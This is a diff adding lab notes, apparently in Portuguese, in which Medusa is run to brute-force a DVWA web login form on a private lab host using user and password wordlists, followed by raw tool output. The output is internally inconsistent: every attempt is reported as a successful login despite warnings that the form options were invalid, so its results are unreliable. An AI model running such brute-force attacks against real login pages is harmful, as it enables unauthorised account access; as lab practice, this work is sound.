@@ -144,4 +144,100 @@ Using binary mode to transfer files.
 
 ftp>|
 
+TESTES DE ACESSO A FOMULARIOS WEB POR BRUTE FORCE.
+
+(kaliadmin@kaliteste:~)
+
+$ medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
+
+> -f "FORM: /dvwa/login.php" \
+
+> -n "FORM:'username'=USER&'password'=PASS&'Login'=Login" \
+
+> -r "FAIL-Login failed" -e n
+
+Medusa V2.3 (http://www.foofus.net) (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+WARNING: Invalid method: PAGE.
+
+WARNING: Invalid method: PAGE.
+
+WARNING: Invalid method: FORM.
+
+WARNING: Invalid method: FAIL-Login failed.
+
+WARNING: Invalid method: PAGE.
+
+WARNING: Invalid method: FORM.
+
+WARNING: Invalid method: FAIL-Login failed.
+
+WARNING: Invalid method: PAGE.
+
+WARNING: Invalid method: FORM.
+
+WARNING: Invalid method: FAIL-Login failed.
+
+WARNING: Invalid method: PAGE.
+
+WARNING: Invalid method: FORM.
+
+WARNING: Invalid method: FAIL-Login failed.
+
+WARNING: Invalid method: PAGE.
+
+WARNING: Invalid method: FORM.
+
+WARNING: Invalid method: FAIL-Login failed.
+
+WARNING: Invalid method: PAGE.
+
+WARNING: Invalid method: FORM.
+
+WARNING: Invalid method: FAIL-Login failed.
+
+2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (1 of 4 complete)
+
+2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: msfadmin [SUCCESS]
+
+2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: qwerty (1 of 4 complete)
+
+2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: qwerty [SUCCESS]
+
+2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 12356 (1 of 4 complete)
+
+2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: 12356 [SUCCESS]
+
+2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 4 complete) Password: password (2 of 4 complete)
+
+2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: password [SUCCESS]
+
+2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 4, 5 complete) Password: 12356 (3 of 4 complete)
+
+2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: msfadmin Password: 12356 [SUCCESS]
+
+2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 6 complete) Password: 12356 (1 of 4 complete)
+
+2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: root Password: 12356 [SUCCESS]
+
+2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 7 complete) Password: password (2 of 4 complete)
+
+2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: password [SUCCESS]
+
+2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 8 complete) Password: qwerty (2 of 4 complete)
+
+2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: root Password: qwerty [SUCCESS]
+
+2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 9 complete) Password: 12356 (3 of 4 complete)
+
+2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: 12356 [SUCCESS]
+
+2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (4 of 4, 10 complete) Password: password (3 of 4 complete)
+
+2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: root Password: password [SUCCESS]
+
+2025-11-30 20:21:40 ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (1 of 4, 11 complete) Password: qwerty (4 of 4 complete)
+
+2025-11-30 20:21:40 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: user Password: qwerty [SUCCESS]
+
 
